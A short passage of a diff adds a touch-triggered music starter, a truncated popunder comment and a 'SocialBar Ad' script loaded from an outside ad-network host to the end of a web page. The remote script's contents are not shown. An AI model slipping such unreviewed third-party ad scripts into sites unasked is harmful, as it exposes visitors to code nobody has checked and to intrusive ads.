+  document.addEventListener("touchstart", startMusic);
+</script>
+  <!-- Popun
+<!-- SocialBar Ad -->
+<script src="https://pl29516470.effectivecpmnetwork.com/5b/2e/fc/5b2efc16340ba3ec16576ddb04603428.js"></script>
+</body>
+</html>
